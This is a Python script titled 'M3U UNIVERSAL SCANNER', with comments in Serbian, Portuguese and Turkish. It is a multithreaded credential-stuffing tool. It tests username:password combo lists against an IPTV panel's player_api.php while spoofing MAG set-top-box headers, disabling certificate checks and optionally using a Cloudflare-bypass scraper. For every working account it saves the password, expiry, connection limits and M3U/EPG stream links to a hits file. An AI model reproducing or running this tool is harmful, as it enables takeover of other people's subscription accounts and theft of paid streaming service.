import logging

# Konfiguracija logovanja
logging.basicConfig(
    filename="scanner.log",
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)

def safe_request(session, url, headers=None, retries=3, timeout=10):
    """Siguran HTTP GET sa retry mehanizmom."""
    import time
    for attempt in range(retries):
        try:
            return session.get(url, headers=headers, timeout=timeout, verify=False)
        except requests.RequestException as e:
            logging.warning(f"Pokusaj {attempt+1} neuspesan za URL {url}: {e}")
            time.sleep(2)
    logging.error(f"Nije uspelo preuzimanje URL-a: {url} nakon {retries} pokusaja.")
    return None


def validate_input(prompt, min_val=1, max_val=100):
    """Validacija broja iz inputa."""
    while True:
        value = input(prompt)
        if value.isdigit():
            val = int(value)
            if min_val <= val <= max_val:
                return val
        logging.error(f"Nevalidan unos: {value}. Pokusaj ponovo.")
        print(f"[ERROR] Molimo unesite broj izmedju {min_val} i {max_val}.")


def main():
    try:
        global hit
        global hit, cpm
        hit = 0
        logging.info("Pokretanje skenera")
        import os,pip
        try:
            import requests
        except:
            print("requests módulo não instalado \n instalando módulo de solicitações\n")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
            import requests

        import random, time, datetime
        import subprocess
        import json, sys, re, base64
        import pathlib
        import threading
        import shutil
        from playsound import playsound

        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = (
            "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:"
            "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:"
            "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:"
            "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:"
            "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:"
            "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:"
            "TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:"
            "TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:"
            "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:"
            "ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:"
            "TLS13-AES-128-GCM-SHA256"
        )
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        logging.captureWarnings(True)
        mac = ""

        nickn = ""
        if nickn == "":
            nickn = "Test-PY"

        try:
            import cfscrape
            sesq = requests.Session()
            ses = cfscrape.create_scraper(sess=sesq)
        except:
            ses = requests.Session()

        try:
            import androidhelper as sl4a
            ad = sl4a.Android()
        except:
            pass

        pattern = r"^\S{2,}:\S{2,}$"
        print("\033[H\033[J", end="")
        say = 0
        hit = 0
        bul = 0
        cpm = 1

        import os
        from tabulate import tabulate

        BLUE = "\033[38;5;27m"
        RESET = "\033[0m"

        def print_separator():
            print(f"{BLUE}" + "─" * 60 + f"{RESET}")

        print_separator()
        print(f"{BLUE}" + tabulate([["M3U UNIVERSAL SCANNER"]], tablefmt="grid") + f"{RESET}")
        print_separator()

        dir = './combo/'
        files = os.listdir(dir)

        table_data = [[f"{BLUE}{i + 1}{RESET}", file] for i, file in enumerate(files)]
        headers = [f"{BLUE}Broj{RESET}", f"{BLUE}Ime fajla{RESET}"]
        print("\n" + tabulate(table_data, headers=headers, tablefmt="grid"))

        print_separator()
        summary_data = [[f"{BLUE}Combo in your folder{RESET}", f"{len(files)} file(s) found!"]]
        print(tabulate(summary_data, tablefmt="grid"))
        print_separator()

        dsyno = str(input(f" {BLUE}Enter the Combo No = {RESET}"))
        say = 0
        for files in os.listdir(dir):
            say += 1
            if dsyno == str(say):
                dosyaa = (dir + files)
                break
        say = 0

        print("\033[H\033[J", end="")
        print_separator()
        print(tabulate([[f"{BLUE}Selected File{RESET}", dosyaa]], tablefmt="grid"))
        print_separator()

        bot_info = [
            [f"{BLUE}Specify the number of bots from...{RESET}", "1 to 100"],
            [f"{BLUE}SET NUMBER...!!{RESET}", ""]
        ]
        print("\n" + tabulate(bot_info, tablefmt="grid"))
        botsay = validate_input(f"\n{BLUE} Bot = {RESET}")

        dsy = dosyaa
        combo = dsy
        dosya = ""
        file = pathlib.Path(dsy)
        if file.exists():
            print(tabulate([[f"{BLUE}File found{RESET}"]], tablefmt="grid"))
        else:
            print(tabulate([[f"{BLUE}Arquivo não encontrado..!{RESET}"]], tablefmt="grid"))
            dosya = "Nenhum"

        if dosya == "Nenhum":
            exit()

        with open(dsy, 'r', encoding='utf-8', errors='ignore') as c:
            totLen = c.readlines()

        uz = len(totLen)

        print("\033[H\033[J", end="")
        print_separator()
        print(tabulate([[f"{BLUE}Bot count{RESET}", botsay]], tablefmt="grid"))
        print_separator()

        print(tabulate([[f"{BLUE}Arquivo selecionado:{RESET}", dsy]], tablefmt="grid"))
        print_separator()
        print(f"\n{BLUE} Enter Server and Port ? {RESET}\n")
        panel = input(f"{BLUE}Panel:Port={RESET} ")

        panel = panel.replace("http://", "")
        panel = panel.replace("/c", "")
        panel = panel.replace("/", "")
        portal = panel
        fx = portal.replace(':', '_')

        print_separator()
        print(tabulate([[f"{BLUE}Include channel category list?{RESET}"]], tablefmt="grid"))
        category_choice = [
            [f"{BLUE}1{RESET}", "Yes"],
            [f"{BLUE}2{RESET}", "No"]
        ]
        print(tabulate(category_choice, headers=[f"{BLUE}Opcija{RESET}", "Odgovor"], tablefmt="grid"))
        kanall = input(f"\n{BLUE}RespostaNão = {RESET}")
        if kanall != "1":
            kanall = "2"

        HEADERd = {
            "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
            "X-User-Agent": "Model: MAG254; Link: Ethernet",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
            "Content-Type": "application/json; charset=UTF-8",
            "Host": portal,
        }

        dosyaa = dosyaa.replace('./combo/', "")
        dosyaa = dosyaa.replace('.txt', "")
        dosy = dosyaa
        dosyaaa = dosy.replace('/', "")

        if int(time.time()) >= int(4102444800):
            print(int(4102444800))
            print(int(time.time()))
            quit()

        def kategori(katelink):
            try:
                res = ses.get(katelink, headers=HEADERd, timeout=15, verify=False)
                veri = ""
                kate = ""
                veri = str(res.text)
                for i in veri.split('category_name":"'):
                    kate = kate + " «❖» " + str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\\/', '/')
            except Exception as e:
                logging.error(f"Greška pri preuzimanju kategorija: {e}")
                kate = ""
            return kate

        def onay(veri, user, pas):
            global kanall
            try:
                status = veri.split('status":')[1]
                status = status.split(',')[0].replace('"', "")
                katelink = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_categories"

                sound = "./sound/hits.mp3"
                file = pathlib.Path(sound)
                try:
                    if file.exists():
                        playsound(sound)
                except:
                    logging.warning("Nije moguće reprodukovati zvuk za hit.")

                acon = veri.split('active_cons":')[1].split(',')[0].replace('"', "")
                mcon = veri.split('max_connections":')[1].split(',')[0].replace('"', "")
                timezone = veri.split('timezone":"')[1].split('",')[0].replace("\\/", "/")
                realm = veri.split('url":')[1].split(',')[0].replace('"', "")
                port = veri.split('port":')[1].split(',')[0].replace('"', "")
                user = veri.split('username":')[1].split(',')[0].replace('"', "")
                passw = veri.split('password":')[1].split(',')[0].replace('"', "")
                bitis = veri.split('exp_date":')[1].split(',')[0].replace('"', "")
                if bitis == "null":
                    bitis = "Unlimited"
                else:
                    bitis = (datetime.datetime.fromtimestamp(int(bitis)).strftime('%d-%m-%Y'))

                today = (str(datetime.datetime.today().strftime('%d-%m-%Y')))
                d1 = datetime.datetime.strptime(today, '%d-%m-%Y')
                d2 = datetime.datetime.strptime(bitis, '%d-%m-%Y') if bitis != "Unlimited" else d1
                daysleft = str(abs((d2 - d1).days))

                kategori_txt = ""
                if kanall == "1":
                    try:
                        kate = ""
                        res = ses.get(katelink, headers=HEADERd, timeout=15, verify=False)
                        veri_k = str(res.text)
                        for i in veri_k.split('category_name":"'):
                            kate = kate + " ❪▪️❫ " + str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\\/', '/')
                        kategori_txt = kate
                    except Exception as e:
                        logging.error(f"Greška pri preuzimanju kategorija u onay: {e}")

                try:
                    url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                    res = ses.get(url5, timeout=15, verify=False)
                    veri = str(res.text)
                    kanalsayisi = str(veri.count("stream_id"))

                    url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                    res = ses.get(url5, timeout=15, verify=False)
                    veri = str(res.text)
                    filmsayisi = str(veri.count("stream_id"))

                    url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                    res = ses.get(url5, timeout=15, verify=False)
                    veri = str(res.text)
                    dizisayisi = str(veri.count("series_id"))
                except Exception as e:
                    logging.error(f"Greška pri brojanju kanala: {e}")
                    kanalsayisi = filmsayisi = dizisayisi = "0"

                m3ulink = "http://" + panel + "/get.php?username=" + user + "&password=" + pas + "&type=m3u_plus"
                epglink = "http://" + panel + "/xmltv.php?username=" + user + "&password=" + pas

                mt = (f""" 
┌▱▱▱▱  PY Details  ▱▱▱▱ 
┃
┃ Data Scan: {today}
┃ Host: {portal}
┃ Realm: http://{realm}
┃ User: {user}
┃ Password: {pas}
┃ Remaining: {daysleft}
┃ Expiration: {bitis}
┃ Active: {acon}
┃ Max Connections: {mcon}
┃ Status: {status}
┃ Channels: {kanalsayisi}
┃ Movies: {filmsayisi}
┃ Series: {dizisayisi}
└ ▱▱▱▱  UNIVERSAL M3U SCANNER  ▱▱▱▱
""")

                if kanall == "1":
                    imzak = f"""
   📺 Link M3U
{m3ulink}

   📜 EPG Link
{epglink}

   🎞 Categorias
{str(kategori_txt)} """
                else:
                    imzak = f"""
   📺 Link M3U
{m3ulink}

   📜 EPG Link
{epglink} """

                yaz(mt + imzak + '\n')
            except Exception as e:
                logging.error(f"Greška u onay(): {e}")

        def yaz(kullanici): 
            try:
                dosya = open('./Hits/ARSENALM3u.py@' + fx + '.txt', 'a+', encoding='utf-8')
                dosya.write(kullanici)
                dosya.close()
            except Exception as e:
                logging.error(f"Greška pri upisu u fajl: {e}")

        from rich.table import Table
        from rich.console import Console
        from rich.live import Live
        from rich import box

        console = Console()
        live = Live(console=console, refresh_per_second=4)
        live.start()

        def echox(user, pas, bot, fyz, oran, hit):
            #global hit
            from rich.table import Table
            from rich.console import Console
            from rich import box
            import time, datetime

            console = Console()
            global cpm
            today1 = datetime.datetime.today().strftime('%H:%M:%S')
            cpmx = (time.time() - cpm)
            cpmx = round(60 / cpmx) if cpmx > 0 else 0
            cpm = cpmx if str(cpmx) != "0" else cpm

            table = Table(
                title="[bold cyan]ᑌᑎᏆᐯᗴᖇᔕᗩ⎳ ᗰ㇋ᑌ ᔕᑕᗩᑎᑎᗴᖇ[/bold cyan]",
                show_header=False,
                expand=True,
                padding=(0, 1),
                box=box.ROUNDED,
                show_lines=True
            )
            table.add_column("Icon", justify="center", width=5, style="bold")
            table.add_column("Label", justify="left", width=18, style="cyan")
            table.add_column("Value", justify="left", width=60, style="white")

            table.add_row("🌐", "Portal", portal)
            table.add_row("👤", "User:Pass", f"{user}:{pas}")
            table.add_row("📦", "Combo Total", str(uz))
            table.add_row("🧾", "Combo Count", str(fyz))
            table.add_row("📊", "Percentage", f"{oran}%")
            table.add_row("⚡", "Speed (CPM)", str(cpm))
            table.add_row("📡", "Hits", str(hit))
            table.add_row("🤖", "Bot", str(bot))
            table.add_row("🕒", "Scan Time", time.strftime('%H:%M:%S'))
            table.add_row("📅", "Scan Date", time.strftime('%d-%m-%Y'))
            table.add_row("👤", "Hits By", nickn)
            table.add_row("🎞", "Combo Name", dosyaaa)
            console.print(table)
            cpm = time.time()

        def d(bot_number):   # 100 thread/bots.......not d1()-d100().....only "d(bot_number)" .................
            global hit
            global cpm
            say = 0
            for fyz in range(bot_number, uz, botsay):
                up = re.search(pattern, totLen[fyz], re.IGNORECASE)
                if up:
                    fyzz = totLen[fyz].split(":")
                    user = fyzz[0].strip() if len(fyzz) > 0 else 'UnknownUser'
                    pas = fyzz[1].strip() if len(fyzz) > 1 else 'UnknownPass'
                    say += 1
                    bot = f'Bot_{bot_number:02}'
                    oran = round((fyz / uz) * 100, 2)
                    echox(user, pas, bot, fyz, oran, hit)

                    link = f"http://{portal}/player_api.php?username={user}&password={pas}&type=m3u"
                    while True:
                        try:
                            res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                            break
                        except Exception as e:
                            logging.warning(f"Greška u zahtjevu za {user}:{pas}, ponovo pokušavam... ({e})")
                            time.sleep(1)
                    veri = str(res.text)
                    if 'username' in veri:
                        status = veri.split('status":')[1].split(',')[0].replace('"', "")
                        if status == 'Active':
                            hit += 1
                            onay(veri, user, pas)

        threads = []
        for i in range(1, botsay + 1):
            t = threading.Thread(target=d, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        live.stop()

    except Exception as e:
        logging.exception(f"Neočekivana greška: {e}")
        print("[FATAL] Desila se neočekivana greška. Pogledaj scanner.log za detalje.")

if __name__ == "__main__":
    main()

